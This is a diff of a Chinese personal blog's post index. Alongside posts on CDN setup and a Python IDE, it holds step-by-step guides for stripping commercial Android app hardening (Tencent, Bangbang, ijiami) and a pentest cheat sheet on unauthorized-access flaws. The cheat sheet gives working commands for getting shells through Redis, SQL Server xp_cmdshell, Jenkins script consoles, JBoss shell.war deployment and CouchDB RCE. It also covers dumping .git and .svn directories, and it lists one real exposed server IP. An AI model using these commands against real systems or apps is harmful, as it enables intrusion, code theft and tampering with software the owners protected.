+      <categories>
+          
+          <category> 搞点东西 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 原创 </tag>
+            
+            <tag> 路由器 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>安卓脱壳之战-某讯脱壳</title>
+      <link href="/2021/03/13/blogs/qqjiagu/"/>
+      <url>/2021/03/13/blogs/qqjiagu/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>今天来个qq的壳子</p><span id="more"></span><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><p>我们今天来脱壳，一样的工具:<br>反射大师<br>虚拟大师<br>MT管理器  </p><p>今天脱壳的软件程序:全力万花筒</p><p>可以看到是qq御安全加固，我们接下来和以前一样先脱壳，我们打开虚拟大师导入并安装软件</p><p>打开反射打开并选择这个软件，点击打开</p><p>接着我们等待加载到主界面，点击中间的图形，然后和昨天一样写出dex文件</p><p>接着我们把写出的dex文件导入到本地！<br>然后我们在MT管理器找到软件位置VMOSfiletransferstation这个文件夹里，然后删除不需要的classes.dex文件，点击修复它</p><p>修复了之后把classes.dex原文件删除，把修复的classes_fix.dex重命名为classes.dex</p><p>上面的就是dex脱壳的教程，几乎通用大家可以记记！  </p><p>接下来就是apk修复教程了，大家用小本本记好！!</p><p>首先我们找到加固的原安装包，点击一下选择查看</p><p>继续点击classes.dex文件，选择dex++方式打开</p><p>然后我们依次点击com/wrapper.proxyapplication/WrapperProxyApplication</p><p>点击打开，然后复制第一个类似包名的东西,应该是classNAME的上一行或者下一行的</p><p>返回到主界面点击AndroidManifest.xml，选择反编译</p><p>然后和60加固一样我们搜索&lt;application替换里面的android:name这里，把我们复制的替换进去，</p><p>然后点击保存返回更新，取消自动签名</p><p>接下来，我们删除加固里面的classes.dex文件，取消自动签名</p><p>然后把脱壳好的文件直接添加进来，打钩自动签名</p><p>到主界面这里已经脱壳+修复完成了！我们点击软件看到已经是伪加固了</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 逆向 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 加固 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>安卓的脱壳之战-邦邦脱壳</title>
+      <link href="/2021/03/13/blogs/bangbangjiagu/"/>
+      <url>/2021/03/13/blogs/bangbangjiagu/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>日期：2020年6月</p><p>今天是邦邦加固的壳！  </p><span id="more"></span><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><p>软件名为:“小学语文数学英语同步”的APP  </p><p>工具：反射大师+MT管理器+虚拟大师  </p><p>首先在本地用mt文件管理器查看安装包，确定是梆梆加固</p><p>接下来开始脱壳，脱壳的方法和360加固、腾讯加固一样，熟手直接下滑跳过这部分！</p><p>我们打开虚拟大师，导入并安装需要脱壳的软件</p><p>然后打开反射大师，选择这个软件并打开</p><p>和之前一样，点击中间的红色图标，然后选择第二个选项【当前ACTIVITY】，接着点击写出dex文件</p><p>然后导出到本地，虚拟大师就可以关闭了！</p><p>接着MT管理器，找到VMOSfiletransferstation这个文件夹，把我们脱好的壳修复一下dex，</p><p>然后删除未修复的，把修复好的重命名为classes.dex</p><p>这dex脱壳了，接下来又到修复apk的时候了，我们找到加固的安装包用mt点击 查看，选择dex++编辑器 编辑 classes.dex</p><p>然后依次点击com.SecShell.SecShell/Helper 点击打开</p><p>然后搜索const-string，复制APPNAME的上一行<br><img src="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture@main/hpp/1620041433000.jpg" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture@main/hpp/1620041433000.jpg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg"><br>然后退出到主界面选择AndroidManifest.xml，点击反编译打开</p><p>搜索&lt;application</p><p>在android:name行把我们刚刚复制的粘贴进去，修改前<br><img src="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture@main/hpp/1620041371000.jpg" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture@main/hpp/1620041371000.jpg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg"><br>修改后<br><img src="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture@main/hpp/1620041532000.jpg" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture@main/hpp/1620041532000.jpg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg"><br>然后点击右上角保存，自动签名打上钩，然后确定</p><p>接下来我们需要去删除残留文件，点击assets，然后把SecShell0.jar这个文件删掉</p><p>接着打开lib文件夹的armeabi，把里面的后三个SO（xxxxSHELL.so,xxxxSECURITY.so）删除</p><p>然后回到主界面，替换classes.dex文件，把我们脱好的classes.dex添加进去</p><p>这样就ok了</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 逆向 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 加固 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>安卓的脱壳之战-i加密加固</title>
+      <link href="/2021/03/12/blogs/ijiami/"/>
+      <url>/2021/03/12/blogs/ijiami/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>今天的脱壳还算简单吧。</p><span id="more"></span><h3 id="准备的软件如下"><a href="#准备的软件如下" class="headerlink" title="准备的软件如下:"></a>准备的软件如下:</h3><p>MT管理器+虚拟大师+反射大师  </p><p>安装包名为“某某输入法”</p><p><img src="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture@main/hpp/1615606666000.jpg" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture@main/hpp/1615606666000.jpg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg"></p><h3 id="去虚拟大师里面导入并安装"><a href="#去虚拟大师里面导入并安装" class="headerlink" title="去虚拟大师里面导入并安装"></a>去虚拟大师里面导入并安装</h3><p><img src="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture@main/hpp/1615606702000.jpg" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture@main/hpp/1615606702000.jpg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg"></p><h3 id="打开反射大师，选择某某输入法打开"><a href="#打开反射大师，选择某某输入法打开" class="headerlink" title="打开反射大师，选择某某输入法打开"></a>打开反射大师，选择某某输入法打开</h3><p><img src="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture@main/hpp/1615606734000.jpg" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture@main/hpp/1615606734000.jpg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg"></p><h3 id="点击中间的图标脱出classes-dex"><a href="#点击中间的图标脱出classes-dex" class="headerlink" title="点击中间的图标脱出classes.dex"></a>点击中间的图标脱出classes.dex</h3><p><img src="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture@main/hpp/1615606757000.jpg" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture@main/hpp/1615606757000.jpg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg"></p><p>然后导出到本地，</p><h3 id="在本地的MT管理器找到脱壳的dex并修复"><a href="#在本地的MT管理器找到脱壳的dex并修复" class="headerlink" title="在本地的MT管理器找到脱壳的dex并修复"></a>在本地的MT管理器找到脱壳的dex并修复</h3><p><img src="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture@main/hpp/1615606781000.jpg" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture@main/hpp/1615606781000.jpg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg"></p><h3 id="然后把没有修复的删除，保留修复的文件重命名为classes-dex"><a href="#然后把没有修复的删除，保留修复的文件重命名为classes-dex" class="headerlink" title="然后把没有修复的删除，保留修复的文件重命名为classes.dex"></a>然后把没有修复的删除，保留修复的文件重命名为classes.dex</h3><p><img src="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture@main/hpp/1615606744000.jpg" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture@main/hpp/1615606744000.jpg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg"></p><h3 id="接着我们找到加固的安装包，点击查看"><a href="#接着我们找到加固的安装包，点击查看" class="headerlink" title="接着我们找到加固的安装包，点击查看"></a>接着我们找到加固的安装包，点击查看</h3><p><img src="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture@main/hpp/1615606773000.jpg" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture@main/hpp/1615606773000.jpg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg"></p><h3 id="老规矩用DEX-编辑器方式打开classes-dex文件"><a href="#老规矩用DEX-编辑器方式打开classes-dex文件" class="headerlink" title="老规矩用DEX++编辑器方式打开classes.dex文件"></a>老规矩用DEX++编辑器方式打开classes.dex文件</h3><p><img src="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture@main/hpp/1615606677000.jpg" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture@main/hpp/1615606677000.jpg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg"></p><h3 id="然后点击s-h-e-l-l，在点一次会出来一个N-和S的选项"><a href="#然后点击s-h-e-l-l，在点一次会出来一个N-和S的选项" class="headerlink" title="然后点击s.h.e.l.l，在点一次会出来一个N 和S的选项"></a>然后点击s.h.e.l.l，在点一次会出来一个N 和S的选项</h3><p><img src="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture@main/hpp/1615606633000.jpg" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture@main/hpp/1615606633000.jpg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg"></p><p><img src="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture@main/hpp/1615606697000.jpg" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture@main/hpp/1615606697000.jpg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg"></p><h3 id="我们点击S文件，然后搜索const-string-v0"><a href="#我们点击S文件，然后搜索const-string-v0" class="headerlink" title="我们点击S文件，然后搜索const-string v0"></a>我们点击S文件，然后搜索const-string v0</h3><p><img src="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture@main/hpp/1615606750000.jpg" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture@main/hpp/1615606750000.jpg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg"></p><h3 id="复制第二个入口com-moumou-input-MyApplication"><a href="#复制第二个入口com-moumou-input-MyApplication" class="headerlink" title="复制第二个入口com.moumou.input.MyApplication"></a>复制第二个入口com.moumou.input.MyApplication</h3><p><img src="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture@main/hpp/1615606788000.jpg" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture@main/hpp/1615606788000.jpg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg"></p><h3 id="然后返回软件主界面，我们点击AndroidManifest-xml，选择反编译"><a href="#然后返回软件主界面，我们点击AndroidManifest-xml，选择反编译" class="headerlink" title="然后返回软件主界面，我们点击AndroidManifest.xml，选择反编译"></a>然后返回软件主界面，我们点击AndroidManifest.xml，选择反编译</h3><p><img src="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture@main/hpp/1615606693000.jpg" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture@main/hpp/1615606693000.jpg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg"></p><h3 id="把入口复制到android-name那段代码修改前"><a href="#把入口复制到android-name那段代码修改前" class="headerlink" title="把入口复制到android:name那段代码修改前"></a>把入口复制到android:name那段代码修改前</h3><p><img src="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture@main/hpp/1615606683000.jpg" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture@main/hpp/1615606683000.jpg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg"></p><p>修改后</p><p><img src="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture@main/hpp/1615606740000.jpg" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture@main/hpp/1615606740000.jpg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg"></p><h3 id="右上角保存退出，取消自动签名确定"><a href="#右上角保存退出，取消自动签名确定" class="headerlink" title="右上角保存退出，取消自动签名确定"></a>右上角保存退出，取消自动签名确定</h3><p><img src="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture@main/hpp/1615606762000.jpg" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture@main/hpp/1615606762000.jpg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg"></p><h3 id="然后我们去删除残留文件，把这几个全部删完"><a href="#然后我们去删除残留文件，把这几个全部删完" class="headerlink" title="然后我们去删除残留文件，把这几个全部删完"></a>然后我们去删除残留文件，把这几个全部删完</h3><p><img src="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture@main/hpp/1615606671000.jpg" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture@main/hpp/1615606671000.jpg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg"></p><h3 id="然后把脱好的壳添加进去，自动签名"><a href="#然后把脱好的壳添加进去，自动签名" class="headerlink" title="然后把脱好的壳添加进去，自动签名"></a>然后把脱好的壳添加进去，自动签名</h3><p><img src="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture@main/hpp/1615606689000.jpg" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture@main/hpp/1615606689000.jpg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg"></p><h3 id="这就脱壳-修复完成了，"><a href="#这就脱壳-修复完成了，" class="headerlink" title="这就脱壳+修复完成了，"></a>这就脱壳+修复完成了，</h3><p>我们安装测试</p><p>可以看到未加固状态，开发者助手分析也是未知的</p><p>这样，本次的爱加密脱壳教程就完了！</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 逆向 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 加固 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>给github pages加CDN</title>
+      <link href="/2021/03/12/blogs/pages_CDN/"/>
+      <url>/2021/03/12/blogs/pages_CDN/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>  自从用了github pages后发现国内访问比较慢，于是想给它加上个七牛云的cdn</p><span id="more"></span><p>以下是我的配置过程</p><p>1.在github 网页 的自定义域名处填写</p><p>www开头的域名</p><p>2.在dnspod处：</p><p>www解析到github给每个人分配的域名上</p><p>根站点解析到七牛云的加速地址</p><p>3.七牛云配置</p><p>加速域名为根域名</p><p>源站信息填写github给每个人分配的域名</p><p>回源host为    www域名</p><p>动态加速，配置完成！</p><p>5.后记</p><p>由于七牛云的昂贵和github在国内开始的封锁，我决定丢弃github的自定义域名，转战vercel加又拍云，十分香。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网站设计 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> cdn </tag>
+            
+            <tag> 原创 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>常见未授权访问漏洞实用技巧</title>
+      <link href="/2021/03/12/blogs/weishouquanbug/"/>
+      <url>/2021/03/12/blogs/weishouquanbug/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>前言</p><p>未授权访问漏洞是常见的攻击入口点，某些严重的未授权访问会直接导致getshell，熟悉常见的未授权访问漏洞排查方法对红蓝双方都有很大的帮助。</p><p>本文对常见的未授权访问利用所需的工具和命令做总结。</p><span id="more"></span><h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><p>3306端口未授权访问，可读取数据库内容，可尝试在web路径写webshell</p><p>工具：Navicat</p><h3 id="sqlserver"><a href="#sqlserver" class="headerlink" title="sqlserver"></a>sqlserver</h3><p>1433端口未授权访问，可读取数据库内容，可尝试执行master..cmdshell</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 exec master.xp..cmdshell &#39;whoami&#39;</span><br><span class="line">2 exec master..cmdshell &#39;dir c:\&#39;</span><br></pre></td></tr></table></figure><p>工具：Navicat</p><h3 id="MongoDB"><a href="#MongoDB" class="headerlink" title="MongoDB"></a>MongoDB</h3><p>27017端口未授权访问，可读取数据库内容</p><p>工具：Navicat，Robo3T</p><h3 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h3><p>27017端口未授权访问，可读取数据库内容</p><p>可通过四种方式getshell：写webshell、写crontabs、写ssh公钥、Redis主从复制(4.x,5.x)</p><p>工具：Redis-cli,fofa:protocol=redis</p><h3 id="Hadoop"><a href="#Hadoop" class="headerlink" title="Hadoop"></a>Hadoop</h3><p>Hadoop webUI界面未授权访问，如果存在New Application API功能，可尝试getshell</p><p>工具：浏览器，<a href="https://github.com/vulhub/vulhub/blob/master/hadoop/unauthorized-yarn/exploit.py">https://github.com/vulhub/vulhub/blob/master/hadoop/unauthorized-yarn/exploit.py</a></p><h3 id="Elasticsearch"><a href="#Elasticsearch" class="headerlink" title="Elasticsearch"></a>Elasticsearch</h3><p>9200端口未授权访问，可非法操作数据</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 http:&#x2F;&#x2F;ip:9200&#x2F;_plugin&#x2F;head&#x2F;  web管理界面</span><br><span class="line">2 http:&#x2F;&#x2F;ip:9200&#x2F;_cat&#x2F;indices  查看集群当前状态</span><br><span class="line">3 http:&#x2F;&#x2F;ip:9200&#x2F;_nodes  查看节点数据</span><br><span class="line">4 http:&#x2F;&#x2F;ip:9200&#x2F;_river&#x2F;_search  查看数据库敏感信息</span><br></pre></td></tr></table></figure><p>工具：浏览器</p><h3 id="ZooKeeper"><a href="#ZooKeeper" class="headerlink" title="ZooKeeper"></a>ZooKeeper</h3><p>2181，2182端口未授权访问，可读取敏感信息，或者在Zookeeper集群内执行kill命令</p><p>工具：netcat，<a href="https://issues.apache.org/jira/secure/attachment/12436620/ZooInspector.zip">https://issues.apache.org/jira/secure/attachment/12436620/ZooInspector.zip</a></p><h3 id="SpringBoot"><a href="#SpringBoot" class="headerlink" title="SpringBoot"></a>SpringBoot</h3><p>SpringBoot，web中env路径配置文件未授权访问，可暴露大量联动设备密码信息</p><p>工具：浏览器</p><h3 id="ds-store"><a href="#ds-store" class="headerlink" title="ds_store"></a>ds_store</h3><p><a href="http://ip/.ds_store">http://ip/.ds_store</a><br>未授权访问，可通过github工具下载web目录</p><p>工具：<a href="https://github.com/lijiejie/ds_store_exp">https://github.com/lijiejie/ds_store_exp</a></p><h3 id="VNC"><a href="#VNC" class="headerlink" title="VNC"></a>VNC</h3><p>vnc用于远程桌面控制，默认端口在5900-5905之间，此类端口未授权访问会导致恶意用户直接控制受控主机</p><p>工具：VNCview</p><h3 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h3><p>docker的2375端口web未授权访问，可通过访问ip:2375/version验证，有可能造成执行目标服务器容器命令如container、image等</p><p>工具：浏览器</p><h3 id="Jenkins"><a href="#Jenkins" class="headerlink" title="Jenkins"></a>Jenkins</h3><p>Jenkins面板<a href="http://ip:8080/manage">http://ip:8080/manage</a></p><p>未授权访问会允许用户选择执行脚本界面，操作一些系统层命令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 println &quot;whoami&quot;.execute().text 命令执行</span><br><span class="line">2 new File (&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&quot;).write(&#39;&lt;?php phpinfo(); ?&gt;&#39;); 写webshell</span><br></pre></td></tr></table></figure><p>工具：浏览器</p><h3 id="Memcached"><a href="#Memcached" class="headerlink" title="Memcached"></a>Memcached</h3><p>Memcached是一套常用的key-value分布式高速缓存系统，由于其设计缺陷没有权限控制模块，若11211端口的服务对公网开放，攻击者无需授权即可通过命令访问Memcached中的敏感信息。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 telnet ip 11211 或 nc -vv &lt;target&gt; 11211</span><br><span class="line">2 无需用户名密码，可以直接连接memcache服务的11211端口</span><br><span class="line">3 stats #查看memcache服务状态</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>工具：netcat，telnet</p><h3 id="JBOSS"><a href="#JBOSS" class="headerlink" title="JBOSS"></a>JBOSS</h3><p>JBOSS的webUI界面<a href="http://ip:8080/jmx-console">http://ip:8080/jmx-console</a></p><p>未授权访问(或默认密码admin/admin)，可导致JBoss的部署管理的信息泄露，攻击者也可以直接上传木马获取webshell</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 点击JMX CONSOLE未授权访问</span><br><span class="line">2 点击jboss.deployment中的deploymentScanner进入应用部署页面</span><br><span class="line">3 使用apache搭建远程木马服务器shell.war</span><br><span class="line">4 addurl-java.lang.String配置访问木马地址http:&#x2F;&#x2F;&lt;ip&gt;&#x2F;shell.war</span><br><span class="line">5 访问http:&#x2F;&#x2F;ip:8080&#x2F;shell&#x2F;</span><br></pre></td></tr></table></figure><p><a href="http://221.229.247.184:8080/jmx-console/">http://221.229.247.184:8080/jmx-console/</a></p><p>工具：浏览器，fofa：”JBoss Management”</p><h3 id="svn"><a href="#svn" class="headerlink" title="svn"></a>svn</h3><p>.svn目录未授权访问，可能导致大量源码泄露</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1svn-extractor.py --url &quot;url with .svn available&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>工具：<a href="https://github.com/anantshri/svn-extractor">https://github.com/anantshri/svn-extractor</a></p><h3 id="git"><a href="#git" class="headerlink" title="git"></a>git</h3><p>.git目录未授权访问，可能导致大量源码泄露</p><p>方法1</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 wget -r -p -np -k http:&#x2F;&#x2F;www.xxx.com&#x2F;.git&#x2F; #先递归批量下载.git目录</span><br><span class="line">2 git log #查看网站的提交记录</span><br><span class="line">3 git reset --hard [log hash] #恢复到指定版本号</span><br></pre></td></tr></table></figure><p>方法2</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GitHack.py http:&#x2F;&#x2F;www.xxx.com&#x2F;.git&#x2F;</span><br></pre></td></tr></table></figure><p>工具：git,<a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p><h3 id="nfs"><a href="#nfs" class="headerlink" title="nfs"></a>nfs</h3><p>nfs默认端口2049，配置不当时，可以远程挂载nfs的共享目录</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 apt install nfs-common 安装nfs客户端</span><br><span class="line">2 showmount -e xx.xx.xx.xx 查看nfs服务器上的共享目录</span><br><span class="line">3 mount -t nfs xx.xx.xx.xx:&#x2F;grdata &#x2F;mnt 挂载到本地</span><br><span class="line">4 umount &#x2F;mnt 卸载目录</span><br></pre></td></tr></table></figure><h3 id="CouchDB"><a href="#CouchDB" class="headerlink" title="CouchDB"></a>CouchDB</h3><p>CouchDB的webui未授权访问时，可通过 <a href="http://xx.xx.xx.xx:5984/_utils/">http://xx.xx.xx.xx:5984/_utils/</a> 页面创建管理员用户，并通过put方式远程代码执行（CVE-2017-12635）</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 curl -X PUT &#39;http:&#x2F;&#x2F;admin:admin@xx.xx.xx.xx:5984&#x2F;_config&#x2F;query_servers&#x2F;cmd&#39; -d &#39;&quot;id &gt;&#x2F;tmp&#x2F;success&quot;&#39;</span><br><span class="line">2 curl -X PUT &#39;http:&#x2F;&#x2F;admin:admin@xx.xx.xx.xx:5984&#x2F;vultest&#39;</span><br><span class="line">3 curl -X PUT &#39;http:&#x2F;&#x2F;admin:admin@xx.xx.xx.xx:5984&#x2F;vultest&#x2F;vul&#39; -d &#39;&#123;&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;&#125;&#39;</span><br><span class="line">4 curl -X POST &#39;http:&#x2F;&#x2F;admin:admin@xx.xx.xx.xx:5984&#x2F;vultest&#x2F;_temp_view?limit&#x3D;10&#39; -d &#39;&#123;&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;&#125;&#39; -H &#39;Content-Type:application&#x2F;json&#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>工具：curl，<a href="https://github.com/vulhub/vulhub/blob/master/couchdb/CVE-2017-12636/exp.py">https://github.com/vulhub/vulhub/blob/master/couchdb/CVE-2017-12636/exp.py</a></p><p>作者：Leticia,文章来源：Leticia’S Blog</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 渗透 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Thonny-适合小白的pyhton的开发环境</title>
+      <link href="/2021/03/10/blogs/thonny-pyide/"/>
+      <url>/2021/03/10/blogs/thonny-pyide/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Thonny —— 一个面向python初学者的 IDE</p><span id="more"></span><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Thonny是一款Python编辑器，基于python内置图形库tkinter开发出来的，支持Windows、Mac、Linux多平台，支持语法着色、代码自动补全、debug等功能，软件容易上手！</p><p><img src="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture@main/hpp/1616765839000.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture@main/hpp/1616765839000.png" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg"></p><h3 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h3><pre><code>    1、容易上手</code></pre><p>　　Thonny内置了Python 3.7，所以只需要一个简单的安装程序，就可以开始学习编程了。（如果有必要，你也可以使用单独的Python安装。） 初始用户界面上没有任何可能分散初学者注意力的功能。</p><p>　　2、无障碍的变量</p><p>　　当你完成hell-worlds后，选择View → Variables，看看你的程序和shell命令是如何影响Python变量的。</p><p>　　3、简单的调试器</p><p>　　只需按Ctrl+F5代替F5，你就可以一步一步地运行你的程序，不需要断点。大步按F6，小步按F7。步骤遵循程序结构，而不仅仅是代码行。</p><p>　　4、通过表达式评估的步骤</p><p>　　如果你使用小步骤，那么你甚至可以看到Python是如何评价你的表达式的。你可以把这个浅蓝色的盒子看成是一张纸，Python 在这里用子表达式的值逐一替换子表达式。</p><p>　　5、函数调用的忠实表示</p><p>　　步入函数调用会打开一个新窗口，里面有单独的局部变量表和代码指针。良好的理解函数调用的工作原理对于理解递归特别重要。</p><p>　　